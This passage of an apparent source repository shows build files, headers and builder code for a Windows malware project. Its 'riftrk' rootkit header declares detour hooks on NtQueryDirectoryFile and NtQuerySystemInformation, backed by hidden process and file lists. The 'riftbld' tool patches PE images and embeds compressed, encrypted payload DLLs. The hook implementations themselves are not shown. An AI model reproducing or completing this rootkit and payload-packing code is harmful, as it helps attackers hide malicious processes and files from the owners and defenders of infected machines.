      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary />
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <PreprocessorDefinitions>_DEBUG</PreprocessorDefinitions>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
    </ClCompile>
    <Link>
      <ShowProgress>LinkVerbose</ShowProgress>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <SubSystem>Windows</SubSystem>
      <EntryPointSymbol>DllMain</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <ExceptionHandling>false</ExceptionHandling>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <CallingConvention>FastCall</CallingConvention>
      <AdditionalOptions>/Zc:sizedDealloc- %(AdditionalOptions)</AdditionalOptions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary />
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <PreprocessorDefinitions>
      </PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>DebugFull</GenerateDebugInformation>
      <ShowProgress>LinkVerbose</ShowProgress>
      <LinkStatus>true</LinkStatus>
      <SubSystem>Windows</SubSystem>
      <LinkTimeCodeGeneration>UseLinkTimeCodeGeneration</LinkTimeCodeGeneration>
      <EntryPointSymbol>DllMain</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <ExceptionHandling>false</ExceptionHandling>
      <AdditionalOptions>/Zc:sizedDealloc- %(AdditionalOptions)</AdditionalOptions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary />
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <PreprocessorDefinitions>_DEBUG</PreprocessorDefinitions>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
    </ClCompile>
    <Link>
      <ShowProgress>LinkVerbose</ShowProgress>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <SubSystem>Windows</SubSystem>
      <EntryPointSymbol>DllMain</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <ExceptionHandling>false</ExceptionHandling>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <AdditionalOptions>/Zc:sizedDealloc- %(AdditionalOptions)</AdditionalOptions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary />
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <PreprocessorDefinitions>
      </PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>DebugFull</GenerateDebugInformation>
      <ShowProgress>LinkVerbose</ShowProgress>
      <LinkStatus>true</LinkStatus>
      <SubSystem>Windows</SubSystem>
      <LinkTimeCodeGeneration>UseLinkTimeCodeGeneration</LinkTimeCodeGeneration>
      <EntryPointSymbol>DllMain</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="detour.cpp" />
    <ClCompile Include="main.cpp" />
    <ClCompile Include="nth.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="rk.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`src/ext/Rootkit/riftrk/riftrk.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="hdr">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="src">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="detour.cpp">
      <Filter>src</Filter>
    </ClCompile>
    <ClCompile Include="nth.cpp">
      <Filter>src</Filter>
    </ClCompile>
    <ClCompile Include="main.cpp">
      <Filter>src</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="rk.h">
      <Filter>hdr</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`src/ext/Rootkit/riftrk/rk.h`:

```h
#pragma once

#include ""

namespace nt {
	typedef enum _FILE_INFORMATION_CLASS {
		FileDirectoryInformation = 1,
		FileFullDirectoryInformation = 2,
		FileBothDirectoryInformation = 3,
		FileIdBothDirectoryInformation = 37,
		FileIdFullDirectoryInformation = 38,
		FileNamesInformation = 12,
		FileObjectIdInformation = 29,
		FileReparsePointInformation = 33
	} FILE_INFORMATION_CLASS, * PFILE_INFORMATION_CLASS;
	typedef NTSTATUS(NTAPI* NtQueryDirectoryFile_t)(
		_In_                       handle  FileHandle,
		_In_opt_                   handle  Event,
		_In_opt_                   PVOID   ApcRoutine,
		_In_opt_                   PVOID   ApcContext,
		_Out_                      PVOID   IoStatusBlock,
		_Out_writes_bytes_(Length) PVOID   FileInformation,
		_In_                       ULONG   Length,
		_In_                       ULONG   FileInformationClass,
		_In_                       BOOLEAN ReturnSingleEntry,
		_In_opt_                   PVOID   FileName,
		_In_                       BOOLEAN RestartScan
		);
	typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
		_In_      ULONG  SystemInformationClass,
		_Out_     PVOID  SystemInformation,
		_In_      ULONG  SystemInformationLength,
		_Out_opt_ PULONG ReturnLength
		);
}

namespace hk {
	extern nt::NtQueryDirectoryFile_t NtQueryDirectoryFile;
	NTSTATUS NTAPI NtQueryDirectoryFileHook(
		_In_ handle FileHandle, _In_opt_ handle Event, _In_opt_ PVOID ApcRoutine, _In_opt_ PVOID ApcContext, _Out_ PVOID IoStatusBlock,
		_Out_writes_bytes_(Length) PVOID FileInformation, _In_ ULONG Length, _In_ ULONG FileInformationClass,
		_In_ BOOLEAN ReturnSingleEntry, _In_opt_ PUNICODE_STRING FileName, _In_ BOOLEAN RestartScan
	);
	extern nt::NtQuerySystemInformation_t NtQuerySystemInformation;
	NTSTATUS NTAPI NtQuerySystemInformationHook(
		_In_      ULONG  SystemInformationClass,
		_Out_     PVOID  SystemInformation,
		_In_      ULONG  SystemInformationLength,
		_Out_opt_ PULONG ReturnLength
	);
}

namespace dt {
	status DetourFunction(_Inout_ void** ppTarget, _In_ void* pHook, _In_range_(5, 40) u8 InstructionLength);
}

namespace vec {
	class AnyVector {
		struct Entry {
			size_t Size;
			byte   Data[];
		};

	public:
		AnyVector();
		~AnyVector();

		void* AllocateObject(_In_ size_t nSize);
		void FreeObject(_In_ void* p);

		u32 GetItemCount();
		void* GetFirstEntry();
		void* GetNextEntry(_In_ void* p);

		void ReadLock();
		void ReadUnlock();
		void WriteLock();
		void WriteUnlock();

	private:
		status ResizeVector(_In_ size_t nSize);

		void*   m_Vec;                // Address of Vector
		size_t  m_Used = 0;           // Size in bytes Used (this allso describes the current offset as there're no possible caves,
						              // everything is contiguous and will be compacted as soon as possible)
		size_t  m_Size;               // Size of Table that is commited
		u32     m_Count = 0;          // Number of Elements stored inside the Vector
		SRWLOCK m_srw = SRWLOCK_INIT; // Slim Read/Write Lock for Thread Synchronization
	};
}

inline vec::AnyVector* g_ProcessList;
inline vec::AnyVector* g_FileList;
// inline vec::AnyVector* RegistryList;

// Current Module BaseAddress
inline handle g_BaseAddress;

```

`src/ext/Rootkit/rkmgr/main.cpp`:

```cpp
#include "mgr.h"

status ExtensionEntry(            // Entrypoint-Callback for nebula mapper
	_In_        u32  CallbackId,  // The id of the callback function requested
	_Inout_opt_ poly CallbackData // Callback specific data that should be interpreted by the propeer handler
) {
	switch (CallbackId) {



	default:
		return S_CREATE(SS_WARNING, SF_ROOTKIT, SC_UNSUPPORTED);
	}

	return SUCCESS;
}
```

`src/ext/Rootkit/rkmgr/mgr.h`:

```h
#pragma once

#include "sdk.h"
```

`src/ext/Rootkit/rkmgr/rkmgr.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{2c1d9272-9a62-4169-a851-58e4e6ba53ae}</ProjectGuid>
    <RootNamespace>rkmgr</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <OutDir>$(SolutionDir)out\bin</OutDir>
    <IntDir>$(SolutionDir).in\$(projectName)\$(Configuration)\</IntDir>
    <TargetExt>.ext</TargetExt>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <OutDir>$(SolutionDir)out\bin</OutDir>
    <IntDir>$(SolutionDir).in\$(projectName)\$(Configuration)\</IntDir>
    <TargetExt>.ext</TargetExt>
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <PreprocessorDefinitions>_DEBUG</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <AdditionalIncludeDirectories>$(SolutionDir)..\..\..\out\sdk</AdditionalIncludeDirectories>
      <ExceptionHandling>false</ExceptionHandling>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
      <RuntimeLibrary />
      <BufferSecurityCheck>false</BufferSecurityCheck>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <ShowProgress>LinkVerbose</ShowProgress>
      <EntryPointSymbol>ExtensionEntry</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>
      </PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <AdditionalIncludeDirectories>$(SolutionDir)..\..\..\out\sdk</AdditionalIncludeDirectories>
      <Optimization>MinSpace</Optimization>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <ExceptionHandling>false</ExceptionHandling>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <RuntimeLibrary />
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>DebugFull</GenerateDebugInformation>
      <ShowProgress>LinkVerbose</ShowProgress>
      <LinkStatus>true</LinkStatus>
      <LinkTimeCodeGeneration>UseLinkTimeCodeGeneration</LinkTimeCodeGeneration>
      <EntryPointSymbol>ExtensionEntry</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="mgr.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`src/ext/Rootkit/rkmgr/rkmgr.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="src">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="hdr">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>src</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="mgr.h">
      <Filter>hdr</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`src/riftbld/bld.cpp`:

```cpp
// Contains Code used exclusively by the Imagerecompiler to patch the binary and relink it correctly
#include "bld.h"

namespace img {
	status MovePhysicalSection(              // Moves the specified section to a new location
		_In_ IMAGE_NT_HEADERS*     NtHeader, // A pointer to the NtHeader that has to be relinked
		_In_ IMAGE_SECTION_HEADER* Section,  // The section to be moved
		_In_ ptr                   Offset    // The new offset at which the section should be moved too (Fileoffset)
	) {

		return SUCCESS;
	}

	status ResizePhysicalSection(            // Resizes the specified section and relinks the image
		_In_ IMAGE_NT_HEADERS*     NtHeader, // A pointer to the NtHeader that has to be patched
		_In_ IMAGE_SECTION_HEADER* Section,  // The Section to be resized
		_In_ size_t                NewSize   // The Size the section should be resized to
	) {
		/* Tasks:
		   1. Modifiy the sizeattributes of the section
		   2. Move and relink sections:
		      -> Find all sections after the resized section
			  -> Find bounds of the of those sections
			  -> move sections to the new location offset as a whole chunk using VIB (Virtual Intermediate Buffer)
			3. Fixup sectionheaders
			4. Fix NtHeader (ImageSize, ...) */

		return SUCCESS;
	}

	u32 TranslateRvaToPa(   // Translates a RVA to a PA in the image
		_In_ handle Module, // The module used for the translation
		_In_ u32    Rva     // The address to be translated
	) {
		auto NtHeader = utl::GetNtHeader(Module);

		// Check if rva is within headers
		if (Rva <= NtHeader->OptionalHeader.SizeOfHeaders)
			return Rva;

		// Check if rva is within sections and translate
		auto Section = IMAGE_FIRST_SECTION(NtHeader);
		for (auto i = 0; i < NtHeader->FileHeader.NumberOfSections; i++) {
			if (Rva >= Section->VirtualAddress &&
				Rva <= Section->VirtualAddress + Section->SizeOfRawData)
				return Rva - Section->VirtualAddress + Section->PointerToRawData;

			Section++;
		}

		// not within the mapable image
		return null;
	}

	status GetExportImageAddress(
		_In_      handle      Module,
		_In_      const char* ExportName,
		_Out_opt_ void*&      ExportAddress
	) {
		auto NtHeader = utl::GetNtHeader(Module);
		auto ExportDirectory = (IMAGE_EXPORT_DIRECTORY*)((ptr)img::TranslateRvaToPa(Module,
			NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) + (ptr)Module);
		Con->PrintFEx(CON_INFO, L"ExportDirectory at 0x%08x", (ptr)ExportDirectory - (ptr)Module);

		auto Ordinal = (u16)-1; // Set to invalid ordinal by default

		if (*ExportName != '@') { // Find ordinal of export
			// Enumerate ExportNameTable and find matching entry
			auto ExportNameTable = (u32*)((ptr)img::TranslateRvaToPa(Module, ExportDirectory->AddressOfNames) + (ptr)Module);
			Con->PrintFEx(CON_INFO, L"ExportNameTable at 0x%08x", (ptr)ExportNameTable - (ptr)Module);

			// Find exportname
			for (auto i = 0; i < ExportDirectory->NumberOfNames; i++) {
				auto ExportedName = (char*)((ptr)img::TranslateRvaToPa(Module, ExportNameTable[i]) + (ptr)Module);

				if (!strcmp(ExportedName, ExportName)) {
					Con->PrintFEx(CON_INFO, L"Exported name found at 0x%08x", (ptr)ExportedName - (ptr)Module);
					auto ExportOrdinalTable = (u16*)((ptr)img::TranslateRvaToPa(
						Module, ExportDirectory->AddressOfNameOrdinals) + (ptr)Module);
					Con->PrintFEx(CON_INFO, L"ExportOrdinalTable at 0x%08x", (ptr)ExportOrdinalTable - (ptr)Module);

					Ordinal = ExportOrdinalTable[i]; break;
				}
			}
		} else // directly use ordinal
			Ordinal = (u16)atoi(ExportName + 1);

		if (Ordinal != (u16)-1) {
			if (Ordinal > ExportDirectory->NumberOfFunctions) {
				Con->PrintFEx(CON_ERROR, L"Ordinal outside of ExportAddressTable: @%d", Ordinal);
				return S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_PARAMETER);
			}

			// Remove export rva from eat
			auto ExportAddressTable = (u32*)((ptr)img::TranslateRvaToPa(Module,
				ExportDirectory->AddressOfFunctions) + (ptr)Module);
			Con->PrintFEx(CON_INFO, L"ExportAddressTable at 0x%08x", (ptr)ExportAddressTable - (ptr)Module);

			ExportAddress = (void*)((ptr)img::TranslateRvaToPa(Module, ExportAddressTable[Ordinal]) + (ptr)Module);
			Con->PrintFEx(CON_SUCCESS, L"Export found @%d, at 0x%08x", Ordinal, (ptr)(ExportAddress) - (ptr)Module);
		} else {
			Con->PrintFEx(CON_WARNING, L"Export not found");
			return S_CREATE(SS_WARNING, SF_BUILDER, SC_INVALID_POINTER);
		}

		return SUCCESS;
	}
}

```

`src/riftbld/bld.h`:

```h
#pragma once

#include "nbp.h"

/* Commandline usage:
   "/[Operation]" : Specifies the operation to execute (this must be the first operand)
                    (The Forward Slash is reserved )

   "-[ParameterTag]:[Argument]" : Specifies the Argument for a specific Parameter(type)
                                  (this can appear in any order as long as it is specified after the operation specification)

   "-[FlagList]" : A list/string of flags that alter the behaviour of the selected operation
                   (this field is optional)

   An example command line could look like:
   """bld.exe /rc -fi:"ply.dll" -ce"""

   this would be then interpreted as:
   - Operation: rc (Add resource to Module)
   - Parameter: fi (File to be added)
     -> "ply.dll" (as the file being added)
   - Flags: -> c (compress inputfile)
            -> e (encrypt inputfile)

   The parser parses any commandline that is valid and
   translates it into a dynamically allocated structure internally,
   that is passed to the main programm.
   When finished the destructor for the object should be called.

   Spaces (' ') are used as command delimiters/terminaters.
   Quotes ('"') toggle the parsing of a section, meaning it is interpreted as one object and not split into multiple.
   Tags can have a maximum length of 4 chars (as they are strored in a 8byte value (UNICODE support))
*/

#define COL_SUCCESS  (FOREGROUND_GREEN)                                          // 0b0010 [S]
#define COL_INFO     (FOREGROUND_RED  | FOREGROUND_GREEN | FOREGROUND_BLUE)      // 0b0111 [+]
#define COL_QUESTION (FOREGROUND_BLUE |                    FOREGROUND_INTENSITY) // 0b1001 [?]
#define COL_WARNING  (FOREGROUND_RED  | FOREGROUND_GREEN                       ) // 0b1110 [!]
#define COL_ERROR    (FOREGROUND_RED  |                    FOREGROUND_INTENSITY) // 0b1100 [X]

#define CON_CREATE(Severity, Question, Color) ((Console::err)(((Severity << 6)) |\
                                              ((Question & 1) << 5) |\
                                              (Color & 0xf)))
#define CON_SUCCESS  CON_CREATE(SS_SUCCESS, false, COL_SUCCESS)
#define CON_INFO     CON_CREATE(SS_MESSAGE, false, COL_INFO)
#define CON_QUESTION CON_CREATE(SS_MESSAGE, true,  COL_QUESTION) // Currently Unsuppported
#define CON_ERROR    CON_CREATE(SS_ERROR,   false, COL_ERROR)
#define CON_WARNING  CON_CREATE(SS_WARNING, false, COL_WARNING)

#define CONVERT_ATOM(Char) (1 << (Char - L'a'))
#define CHECK_BMPFLAG(BitMap, Char) ((BitMap >> (Char - L'a')) & 1)

class Console {
public:
	/* Errorlevel Format:
	   BB         | B        | B        | BBBB
	   -----------+----------+----------+-----------
	   Errorlevel | Question | Reserved | Text Color */
	typedef unsigned char err;

	Console(_In_ dword pId = 0);
	~Console();

	status Cls();
	status PrintF(_In_z_ const wchar* Text, _In_opt_ ...);
	status PrintFEx(_In_opt_ err ErrorLevel, _In_z_ const wchar* Text, _In_opt_ ...);

	// Public Configuration members
	u8     m_BaseIndent = 0; // describes how far to indent a print (tree's)
	err    m_ErrorLevel;     // The currently used ErrorLevel

protected:
	// Console Input/Output(/Error) Handle
	handle m_ConsoleInput;
	handle m_ConsoleOutput;

private:
	status vPrintFormatW(_In_z_ const wchar* Text, _In_opt_ va_list Va);

	CONSOLE_SCREEN_BUFFER_INFOEX m_csbiBackup;
	static u32    m_nRefCounter; // Class Reference Counter
	       void*  m_Buffer;      // Temporery Buffer (Pool) that will be used to Format, Get Text and more (multiple of Pagesize)
	       size_t m_BufferSize;  // The size of data inside the temporery Buffer (Pool)
};

class FileMap {
public:
	// Add support for readonly Pages
	FileMap() = delete;
	FileMap(
		_In_z_ const wchar* szFile,
		_In_         dword  dwProtection = PAGE_READWRITE
	);
	~FileMap();

	void*  Data() const;
	size_t Size() const;

private:
	void*  m_Mapping;
	size_t m_FileSize;
	handle m_hMap;
	handle m_hFile;
};

namespace img {
	u32 TranslateRvaToPa(_In_ handle Module, _In_ u32 Rva);
	status GetExportImageAddress(
		_In_      handle      PeStream,
		_In_      const char* ExportName,
		_Out_opt_ void*&      ExportAddress
	);
}

status RunChildService(
	_In_           void*  Buffer,
	_In_z_   const wchar* CommandLine,
	_In_opt_              ...
);


inline Console* Con;

```

`src/riftbld/ioc.cpp`:

```cpp
// IO Controller - Manages File And Console IO
#include "bld.h"

#pragma region Console
u32    Console::m_nRefCounter;

Console::Console(
	_In_ dword ProcessId
) {
	m_csbiBackup.cbSize = sizeof(m_csbiBackup);
	GetConsoleScreenBufferInfoEx(m_ConsoleOutput, &m_csbiBackup);

	m_ConsoleInput  = GetStdHandle(STD_INPUT_HANDLE);
	m_ConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);

	if (!(_InterlockedIncrement(&m_nRefCounter) - 1)) {
	#if 0 // Attach to existing console or create (not used here as the subsystem does this for us)
		if (!ProcessId)
			ProcessId = GetCurrentProcessId();
		if (!AttachConsole(ProcessId))
			if (!AllocConsole())
				RaiseException(S_CREATE(SS_ERROR, SF_BUILDER, SC_COULDNT_ATTACH), 0, 0, nullptr);
	#endif

		m_Buffer = VirtualAlloc(nullptr, 0x10000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	}
}
Console::~Console() {
	if (!_InterlockedDecrement(&m_nRefCounter))
		VirtualFree(m_Buffer, 0, MEM_RELEASE);
	SetConsoleScreenBufferInfoEx(m_ConsoleOutput, &m_csbiBackup);
}

status Console::Cls() {
	CONSOLE_SCREEN_BUFFER_INFO csbi;
	status Status = SUCCESS;

	Status = !GetConsoleScreenBufferInfo(m_ConsoleOutput, &csbi);
	dword dw;
	Status = !FillConsoleOutputCharacterW(m_ConsoleOutput, 0, csbi.dwSize.X * csbi.dwSize.Y, { 0, 0 }, &dw);
	Status = !GetConsoleScreenBufferInfo(m_ConsoleOutput, &csbi);
	Status = !FillConsoleOutputAttribute(m_ConsoleOutput, csbi.wAttributes, csbi.dwSize.X * csbi.dwSize.Y, { 0, 0 }, &dw);
	Status = !SetConsoleCursorPosition(m_ConsoleOutput, { 0, 0 });

	return Status ? S_CREATE(SS_WARNING, SF_NULL, SC_INCOMPLETE) : Status;
}

// TODO: Add more modes like raw print and headlines
// IMPROVEMENT: rewrite to formatter for new systems
status Console::vPrintFormatW(_In_z_ const wchar* Text, _In_opt_ va_list VariableArgumentList) {
	// Format Message
	vswprintf_s((wchar*)m_Buffer, 0x1000, Text, VariableArgumentList);
	m_BufferSize = wcslen((wchar*)m_Buffer) * sizeof(wchar);

	// Print Message
	CONSOLE_SCREEN_BUFFER_INFO csbi;
	GetConsoleScreenBufferInfo(m_ConsoleOutput, &csbi);
	word Attributes = csbi.wAttributes & 0xfff0;
		Attributes |= m_ErrorLevel & 0xf;
	SetConsoleTextAttribute(m_ConsoleOutput, Attributes);

	SetConsoleCursorPosition(m_ConsoleOutput, { 0 + m_BaseIndent, csbi.dwCursorPosition.Y });
	wchar Symbol[] = L"[ ] ";
	switch (m_ErrorLevel) {
	case CON_SUCCESS:  Symbol[1] = L'S'; break;
	case CON_INFO:     Symbol[1] = L'+'; break;
	case CON_QUESTION: Symbol[1] = L'?'; break;
	case CON_WARNING:  Symbol[1] = L'!'; break;
	case CON_ERROR:    Symbol[1] = L'X'; break;
	}
	u32 v0;
	WriteConsoleW(m_ConsoleOutput, Symbol, 4, &v0, nullptr);

	auto BufferOffset = (const wchar*)m_Buffer;
	i16 linecounter = 1;
	while (m_BufferSize) {
		const wchar* Delimiter = wcschr((wchar*)BufferOffset, L'\n');
		if (Delimiter) {
			WriteConsoleW(m_ConsoleOutput, BufferOffset, (u32)(Delimiter - BufferOffset), &v0, nullptr);
			m_BufferSize -= (ptr)Delimiter - (ptr)BufferOffset + 2;
			BufferOffset = Delimiter + 1;
			SetConsoleCursorPosition(m_ConsoleOutput, { 4 + m_BaseIndent, csbi.dwCursorPosition.Y + linecounter });
			linecounter++;
		} else {
			WriteConsoleW(m_ConsoleOutput, BufferOffset, m_BufferSize / sizeof(wchar), &v0, nullptr);
			m_BufferSize = 0;
		}
	}

	SetConsoleCursorPosition(m_ConsoleOutput, { 0 , csbi.dwCursorPosition.Y + linecounter });
	SetConsoleTextAttribute(m_ConsoleOutput, csbi.wAttributes); // Reset Attributes after printing
	return SUCCESS;
}

status Console::PrintF(
	_In_z_ const wchar* Text,
	_In_opt_ ...
) {
	va_list Va; va_start(Va, Text);
	m_ErrorLevel = CON_INFO;
	status Status = vPrintFormatW(Text, Va);
	va_end(Va);
	return Status;
}
status Console::PrintFEx(
	_In_opt_       err    ErrorLevel,
	_In_z_   const wchar* Text,
	_In_opt_              ...
) {
	va_list Va; va_start(Va, Text);
	m_ErrorLevel = ErrorLevel ? ErrorLevel : CON_INFO;
	status Status = vPrintFormatW(Text, Va);
	va_end(Va);
	return Status;
}
#pragma endregion

#pragma region FileMapping
FileMap::FileMap(
	_In_z_ const wchar* szFile,
	_In_         dword  dwProtection
) {
	if ((m_hFile = CreateFileW(szFile, GENERIC_READWRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr)) == INVALID_HANDLE_VALUE)
		RaiseException((dword)S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_HANDLE), 0, 0, nullptr);
	if (!(m_hMap = CreateFileMappingW(m_hFile, nullptr, dwProtection, 0, 0, nullptr)))
		RaiseException((dword)S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_HANDLE), 0, 0, nullptr);
	if(!(m_Mapping = MapViewOfFile(m_hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0)))
		RaiseException((dword)S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_POINTER), 0, 0, nullptr);
	if(!GetFileSizeEx(m_hFile, (LARGE_INTEGER*)&m_FileSize))
		RaiseException((dword)S_CREATE(SS_ERROR, SF_BUILDER, SC_INVALID_SIZE), 0, 0, nullptr);
}
FileMap::~FileMap() {
	FlushViewOfFile(m_hMap, m_FileSize);
